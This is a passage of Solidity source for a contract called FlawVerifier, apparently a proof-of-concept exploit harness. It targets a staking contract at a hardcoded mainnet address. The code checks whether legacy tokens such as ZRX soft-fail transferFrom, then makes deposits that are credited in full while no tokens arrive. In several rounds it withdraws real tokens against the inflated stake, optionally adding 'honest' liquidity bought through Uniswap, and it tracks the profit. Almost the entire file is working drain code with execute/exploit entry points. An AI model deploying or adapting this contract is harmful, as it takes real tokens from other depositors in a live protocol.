        (ok, returndata) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        if (!ok) {
            return (false, false);
        }
        if (returndata.length == 0) {
            return (true, true);
        }
        if (returndata.length < 32) {
            return (true, false);
        }
        return (true, abi.decode(returndata, (bool)));
    }
}

contract HonestDepositor {
    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function approveAndDeposit(address staking, address token, uint256 amount) external {
        require(msg.sender == owner, "only owner");
        require(_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, staking, 0)), "approve0 failed");
        require(_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, staking, amount)), "approve failed");
        IStakingLike(staking).deposit(token, amount, address(0));
    }

    function _callOptionalReturn(address token, bytes memory data) private returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }
}

contract FlawVerifier {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address public constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
    address public constant FUN = 0x419D0d8BdD9aF5e606Ae2232ed285Aff190E711b;
    address public constant WBTC_SWAPP_LP = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    string public constant EXPLOIT_PATH =
        "approve a legacy token whose transferFrom can soft-fail -> call deposit(token, amount, ...) and receive full internal credit despite zero receipt -> let a separate honest depositor fund the same token pool -> withdraw real tokens against the inflated stake";

    uint256 public constant SUPPORTED_PATH_INDEX = 0;
    uint256 private constant PATH_INDEX_0 = 1;
    uint256 private constant STEP_APPROVE = 1 << 8;
    uint256 private constant STEP_PHANTOM_DEPOSIT = 1 << 9;
    uint256 private constant STEP_HONEST_LIQUIDITY = 1 << 10;
    uint256 private constant STEP_WITHDRAW = 1 << 11;
    uint256 private constant STEP_MASK = STEP_APPROVE | STEP_PHANTOM_DEPOSIT | STEP_HONEST_LIQUIDITY | STEP_WITHDRAW;
    uint256 private constant MAX_ROUNDS = 6;
    uint256 private constant MIN_ROUNDS = 2;
    uint256 private constant PROBE_AMOUNT = 1e18;

    address public target;
    address public exploitToken;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    string public failureReason;

    uint128 public preparedUntilEpoch;

    uint256 public ATTACK_AMOUNT;
    uint256 public configuredAttackAmount;
    uint256 public chosenRounds;
    uint256 public initialTargetLiquidity;
    uint256 public finalTargetLiquidity;

    uint256 public attackerBalanceBefore;
    uint256 public attackerBalanceAfter;

    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterHonestDeposit;
    uint256 public targetBalanceAfterWithdraw;

    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;

    uint256 public cumulativeRequestedDeposit;
    uint256 public cumulativeObservedReceipt;
    uint256 public honestLiquidityObserved;
    uint256 public pathCoverageBitmap;

    address private netProfitToken;
    uint256 private netProfitAmount;
    address private probe;
    address private honestDepositor;

    constructor() {
        target = DEFAULT_TARGET;
        exploitToken = ZRX;
    }

    receive() external payable {}

    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
        require(!executed, "already executed");
        if (target_ != address(0)) {
            target = target_;
        }
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
        }
        configuredAttackAmount = attackAmount_;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function run() external returns (uint256) {
        return _run();
    }

    function exploit() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        if (netProfitToken != address(0)) {
            return netProfitToken;
        }
        return exploitToken;
    }

    function profitAmount() external view returns (uint256) {
        return netProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return EXPLOIT_PATH;
    }

    function supportedPathIndex() external pure returns (uint256) {
        return SUPPORTED_PATH_INDEX;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return netProfitAmount;
        }
        executed = true;
        pathCoverageBitmap = PATH_INDEX_0;
        netProfitToken = exploitToken;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            return 0;
        }

        if (exploitToken == address(0) || exploitToken.code.length == 0) {
            failureReason = "exploit token not deployed";
            return 0;
        }

        if (_isStableCoin(exploitToken)) {
            failureReason = "stablecoin path excluded by finding";
            return 0;
        }

        if (!_supportsSoftFail(exploitToken)) {
            failureReason = "configured token does not soft-fail transferFrom";
            return 0;
        }

        uint256 helperRounds = 0;
        if (address(this).balance > 0 && UNISWAP_V2_ROUTER.code.length > 0) {
            (helperRounds, ) = _selectBestRounds(address(this).balance);
        }

        if (!_attemptExploit(exploitToken, helperRounds)) {
            if (bytes(failureReason).length == 0) {
                failureReason = "exploit attempt failed";
            }
            return 0;
        }

        netProfitToken = exploitToken;
        netProfitAmount = attackerBalanceAfter - attackerBalanceBefore;
        ATTACK_AMOUNT = netProfitAmount;
        profitAchieved = netProfitAmount > 0;
        hypothesisValidated = profitAchieved && recordedStakeAfterWithdraw == 0 && cumulativeObservedReceipt < cumulativeRequestedDeposit;
        if (profitAchieved) {
            failureReason = "";
        }
        return netProfitAmount;
    }

    function _attemptExploit(address token, uint256 helperRounds) internal returns (bool) {
        _resetObservations();

        if (!_prepareEpochs(token)) {
            return false;
        }

        attackerBalanceBefore = _readTokenBalance(token, address(this));
        initialTargetLiquidity = _readTokenBalance(token, target);
        finalTargetLiquidity = initialTargetLiquidity;
        honestLiquidityObserved = initialTargetLiquidity;

        uint256 directRounds;
        if (initialTargetLiquidity > 0) {
            (directRounds, ) = _selectBestRounds(initialTargetLiquidity);
            if (directRounds == 0) {
                directRounds = MIN_ROUNDS;
            }
            if (!_runDirectDrainRounds(token, directRounds, initialTargetLiquidity)) {
                return false;
            }
        }

        if (helperRounds > 0) {
            if (!_runHelperLiquidityRounds(token, helperRounds, address(this).balance)) {
                return false;
            }
        }

        attackerBalanceAfter = _readTokenBalance(token, address(this));
        finalTargetLiquidity = _readTokenBalance(token, target);

        chosenRounds = helperRounds > 0 ? helperRounds : directRounds;

        if (attackerBalanceAfter <= attackerBalanceBefore) {
            failureReason = "no positive profit realized";
            return false;
        }

        if ((pathCoverageBitmap & STEP_MASK) != STEP_MASK) {
            failureReason = "exploit path not fully exercised";
            return false;
        }

        return true;
    }

    function _runDirectDrainRounds(address token, uint256 rounds, uint256 totalLiquidity) internal returns (bool) {
        uint256 remaining = _boundedAmount(totalLiquidity);
        if (remaining == 0) {
            return true;
        }

        pathCoverageBitmap |= STEP_HONEST_LIQUIDITY;

        for (uint256 round = 0; round < rounds; round++) {
            if (remaining == 0) {
                break;
            }

            uint256 amount = _roundAmount(remaining, rounds - round);
            uint256 liveLiquidity = _readTokenBalance(token, target);
            if (amount > liveLiquidity) {
                amount = liveLiquidity;
            }
            if (amount == 0) {
                break;
            }

            if (!_phantomDepositAndWithdraw(token, amount, false)) {
                return false;
            }

            remaining -= amount;
        }

        return true;
    }

    function _runHelperLiquidityRounds(address token, uint256 rounds, uint256 totalEthBudget) internal returns (bool) {
        if (rounds == 0 || totalEthBudget == 0) {
            return true;
        }

        if (!_ensureHonestDepositor()) {
            return false;
        }

        uint256 remainingEth = totalEthBudget;

        for (uint256 round = 0; round < rounds; round++) {
            uint256 roundBudget = _roundAmount(remainingEth, rounds - round);
            if (roundBudget == 0) {
                break;
            }

            uint256 honestAmount = _swapBudgetForHonestTokens(token, roundBudget);
            if (honestAmount == 0) {
                failureReason = "swap produced no honest liquidity";
                return false;
            }

            honestLiquidityObserved += honestAmount;
            pathCoverageBitmap |= STEP_HONEST_LIQUIDITY;

            if (!_phantomDepositAndWithdraw(token, honestAmount, true)) {
                return false;
            }

            remainingEth -= roundBudget;
        }

        return true;
    }

    function _phantomDepositAndWithdraw(address token, uint256 amount, bool helperDepositAfterPhantom) internal returns (bool) {
        targetBalanceBeforeDeposit = _readTokenBalance(token, target);
        recordedStakeBeforeDeposit = _readStake(address(this), token);

        if (!_forceApprove(token, target, amount)) {
            failureReason = "approve failed";
            return false;
        }
        pathCoverageBitmap |= STEP_APPROVE;

        try IStakingLike(target).deposit(token, amount, address(0)) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "deposit reverted";
            return false;
        }

        targetBalanceAfterDeposit = _readTokenBalance(token, target);
        recordedStakeAfterDeposit = _readStake(address(this), token);

        uint256 observedReceipt = targetBalanceAfterDeposit > targetBalanceBeforeDeposit
            ? targetBalanceAfterDeposit - targetBalanceBeforeDeposit
            : 0;

        cumulativeRequestedDeposit += amount;
        cumulativeObservedReceipt += observedReceipt;

        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + amount) {
            failureReason = "deposit did not credit the full requested amount";
            return false;
        }

        if (observedReceipt >= amount) {
            failureReason = "token transferred the full requested amount";
            return false;
        }
        pathCoverageBitmap |= STEP_PHANTOM_DEPOSIT;

        if (helperDepositAfterPhantom) {
            try HonestDepositor(honestDepositor).approveAndDeposit(target, token, amount) {
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "honest deposit reverted";
                return false;
            }

            targetBalanceAfterHonestDeposit = _readTokenBalance(token, target);
            if (targetBalanceAfterHonestDeposit < targetBalanceAfterDeposit + amount) {
                failureReason = "honest liquidity not received in full";
                return false;
            }
        }

        try IStakingLike(target).withdraw(token, amount) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "withdraw reverted";
            return false;
        }

        targetBalanceAfterWithdraw = _readTokenBalance(token, target);
        recordedStakeAfterWithdraw = _readStake(address(this), token);

        if (recordedStakeAfterWithdraw != recordedStakeBeforeDeposit) {
            failureReason = "withdraw did not clear the inflated stake";
            return false;
        }

        pathCoverageBitmap |= STEP_WITHDRAW;
        return true;
    }

    function _selectBestRounds(uint256 availableAmount) internal view returns (uint256 bestRounds_, uint256 bestProfit_) {
        if (availableAmount == 0) {
            return (0, 0);
        }

        bestRounds_ = MIN_ROUNDS;
        bestProfit_ = _projectProfit(availableAmount, MIN_ROUNDS);

        for (uint256 rounds = MIN_ROUNDS + 1; rounds <= MAX_ROUNDS; rounds++) {
            uint256 candidateProfit = _projectProfit(availableAmount, rounds);
            if (candidateProfit > bestProfit_) {
                bestProfit_ = candidateProfit;
                bestRounds_ = rounds;
            } else {
                break;
            }
        }
    }

    function _projectProfit(uint256 availableAmount, uint256 rounds) internal view returns (uint256 projected) {
        uint256 remaining = availableAmount;
        bool usingEth = availableAmount == address(this).balance && UNISWAP_V2_ROUTER.code.length > 0;

        for (uint256 round = 0; round < rounds; round++) {
            uint256 amount = _roundAmount(remaining, rounds - round);
            if (amount == 0) {
                break;
            }

            if (usingEth) {
                projected += _quoteSwap(exploitToken, amount);
            } else {
                projected += amount;
            }

            remaining -= amount;
        }
    }

    function _roundAmount(uint256 remaining, uint256 roundsLeft) internal pure returns (uint256) {
        if (remaining == 0 || roundsLeft == 0) {
            return 0;
        }
        if (roundsLeft == 1) {
            return remaining;
        }
        uint256 amount = remaining / roundsLeft;
        if (amount == 0) {
            amount = remaining;
        }
        return amount;
    }

    function _prepareEpochs(address token) internal returns (bool) {
        uint128 currentEpoch;
        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "failed to read current epoch";
            return false;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "failed to read epoch initialization state";
                return false;
            }

            if (!initialized) {
                try IStakingLike(target).manualEpochInit(tokens, epoch) {
                } catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "manual epoch init reverted";
                    return false;
                }
            }

            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _ensureProbe() internal returns (bool) {
        if (probe != address(0)) {
            return true;
        }
        probe = address(new TransferFromProbe());
        return probe != address(0);
    }

    function _ensureHonestDepositor() internal returns (bool) {
        if (honestDepositor != address(0)) {
            return true;
        }
        honestDepositor = address(new HonestDepositor(address(this)));
        return honestDepositor != address(0);
    }

    function _supportsSoftFail(address token) internal returns (bool) {
        if (token.code.length == 0) {
            return false;
        }
        if (!_ensureProbe()) {
            return false;
        }
        if (!_forceApprove(token, probe, PROBE_AMOUNT)) {
            return false;
        }
        (bool ok, bool returnedBool) = TransferFromProbe(probe).probe(token, address(this), target, PROBE_AMOUNT);
        return ok && !returnedBool;
    }

    function _swapBudgetForHonestTokens(address token, uint256 ethAmount) internal returns (uint256 bought) {
        uint256 quotedOut = _quoteSwap(token, ethAmount);
        if (quotedOut == 0) {
            return 0;
        }

        uint256 helperBefore = _readTokenBalance(token, honestDepositor);
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 minOut = quotedOut * 98 / 100;
        if (minOut == 0) {
            minOut = 1;
        }

        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: ethAmount}(
            minOut,
            path,
            honestDepositor,
            block.timestamp
        ) returns (uint256[] memory) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "swap reverted";
            return 0;
        }

        uint256 helperAfter = _readTokenBalance(token, honestDepositor);
        if (helperAfter <= helperBefore) {
            return 0;
        }
        bought = helperAfter - helperBefore;
    }

    function _quoteSwap(address token, uint256 ethAmount) internal view returns (uint256) {
        if (token == address(0) || ethAmount == 0 || UNISWAP_V2_ROUTER.code.length == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER).getAmountsOut(ethAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length < 2) {
                return 0;
            }
            return amounts[1];
        } catch {
            return 0;
        }
    }

    function _boundedAmount(uint256 amount) internal view returns (uint256) {
        if (configuredAttackAmount != 0 && configuredAttackAmount < amount) {
            return configuredAttackAmount;
        }
        return amount;
    }

    function _isStableCoin(address token) internal pure returns (bool) {
        return token == USDC || token == USDT || token == DAI;
    }

    function _readStake(address user, address token) internal view returns (uint256) {
        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _readTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory returndata) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || returndata.length < 32) {
            return 0;
        }
        return abi.decode(returndata, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }

    function _resetObservations() internal {
        attackerBalanceBefore = 0;
        attackerBalanceAfter = 0;
        targetBalanceBeforeDeposit = 0;
        targetBalanceAfterDeposit = 0;
        targetBalanceAfterHonestDeposit = 0;
        targetBalanceAfterWithdraw = 0;
        recordedStakeBeforeDeposit = 0;
        recordedStakeAfterDeposit = 0;
        recordedStakeAfterWithdraw = 0;
        cumulativeRequestedDeposit = 0;
        cumulativeObservedReceipt = 0;
        initialTargetLiquidity = 0;
        finalTargetLiquidity = 0;
        honestLiquidityObserved = 0;
        pathCoverageBitmap = PATH_INDEX_0;
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
    }
}

contract FlawVerifierConfiguredHarness is FlawVerifier {
    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
        target = target_;
        exploitToken = exploitToken_;
        configuredAttackAmount = attackAmount_;
    }
}
